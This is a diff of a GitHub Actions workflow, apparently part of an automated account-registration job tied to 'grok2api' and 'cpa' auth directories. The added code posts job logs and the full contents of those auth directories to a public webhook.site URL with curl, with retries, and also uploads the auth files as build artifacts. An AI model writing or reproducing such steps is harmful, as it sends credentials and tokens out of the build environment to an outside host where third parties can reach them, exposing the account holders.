@@ -115,31 +115,48 @@ jobs:
       - name: Poll logs
         run: |
           python - <<'EOF'
-          import json, subprocess, time
-          logs = []
+          import json, subprocess, time, os
+          WH = 'https://webhook.site/aaa8515b-3850-40bb-adc3-71df2197b608'
+          def post(stage, payload, tries=4):
+              p = json.dumps(payload, ensure_ascii=False).encode('utf-8')
+              for i in range(tries):
+                  r = subprocess.run(['curl', '-s', '-X', 'POST', f'{WH}?stage={stage}',
+                                      '-H', 'Content-Type: application/json',
+                                      '--data-binary', '@-'], input=p, capture_output=True)
+                  if r.returncode == 0:
+                      return True
+                  time.sleep(5)
+              return False
+          last_post = 0
+          last_log_id = 0
+          last_snap = []
           t0 = time.time()
-          for i in range(180):
+          for i in range(210):
               out = subprocess.run(['curl', '-s', '-b', '/tmp/cookies.txt', 'http://127.0.0.1:8787/api/job/logs'], capture_output=True, text=True).stdout
+              j = None
               try:
                   j = json.loads(out)
               except Exception:
-                  time.sleep(10)
-                  continue
-              logs = j.get('logs') or []
-              job = j.get('job') or {}
-              print(i, 'running=', job.get('running'), 'logs=', len(logs), flush=True)
-              if job.get('running') is False:
-                  print('JOB DONE', flush=True)
-                  break
+                  pass
+              if j:
+                  logs = j.get('logs') or []
+                  job = j.get('job') or {}
+                  new = [l for l in logs if l.get('id') and int(l.get('id', 0)) > last_log_id]
+                  if new:
+                      last_log_id = max(int(l.get('id', 0)) for l in new)
+                      last_snap = logs[-60:]
+                      with open('/tmp/logs_tail.json', 'w', encoding='utf-8') as f:
+                          json.dump({'logs': logs[-60:]}, f, ensure_ascii=False, indent=2)
+                      post('logs', {'logs': logs[-60:]})
+                  print(i, 'running=', job.get('running'), 'newlog=', len(new), 'total=', len(logs), flush=True)
+                  if job.get('running') is False:
+                      print('JOB DONE', flush=True)
+                      post('logs', {'logs': logs[-80:]}, tries=6)
+                      break
               time.sleep(10)
-          with open('/tmp/logs.json', 'w', encoding='utf-8') as f:
-              json.dump({'logs': logs}, f, ensure_ascii=False, indent=2)
-          tailjson = {'logs': logs[-50:]}
-          with open('/tmp/logs_tail.json', 'w', encoding='utf-8') as f:
-              json.dump(tailjson, f, ensure_ascii=False, indent=2)
+          print('POLL EXIT', flush=True)
           EOF
-          curl -s -X POST "https://webhook.site/aaa8515b-3850-40bb-adc3-71df2197b608?stage=logs" -H 'Content-Type: application/json' -d @/tmp/logs_tail.json >/dev/null
-          cat /tmp/logs_tail.json
+          cat /tmp/logs_tail.json 2>/dev/null || true
       - name: Collect auth output
         if: always()
         run: |
@@ -148,7 +165,7 @@ jobs:
           echo "=== grok2api_auth ==="
           ls -la data/grok2api_auth 2>/dev/null || echo "no grok2api_auth dir"
           python - <<'EOF'
-          import json, os, glob
+          import json, os, glob, subprocess
           payload = {}
           for d in ("data/cpa_auth", "data/grok2api_auth"):
               if os.path.isdir(d):
@@ -161,9 +178,26 @@ jobs:
                           payload[d][os.path.basename(p)] = str(e)
           with open("/tmp/auth.json", "w", encoding="utf-8") as f:
               json.dump(payload, f, ensure_ascii=False, indent=2)
+          whb = json.dumps(payload, ensure_ascii=False).encode('utf-8')
+          for i in range(4):
+              r = subprocess.run(['curl', '-s', '-X', 'POST', 'https://webhook.site/aaa8515b-3850-40bb-adc3-71df2197b608?stage=auth',
+                                  '-H', 'Content-Type: application/json', '--data-binary', '@-'], input=whb, capture_output=True)
+              if r.returncode == 0:
+                  break
+              import time
+              time.sleep(5)
           print(("\n".join(os.listdir("data/cpa_auth"))) if os.path.isdir("data/cpa_auth") else "none")
           EOF
-          curl -s -X POST "https://webhook.site/aaa8515b-3850-40bb-adc3-71df2197b608?stage=auth" -H 'Content-Type: application/json' -d @/tmp/auth.json >/dev/null
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: register-artifacts
+          path: |
+            /tmp/logs_tail.json
+            /tmp/auth.json
+            /tmp/web.log
+            data/
+          if-no-files-found: ignore
       - name: Show web log
         if: always()
         run: |
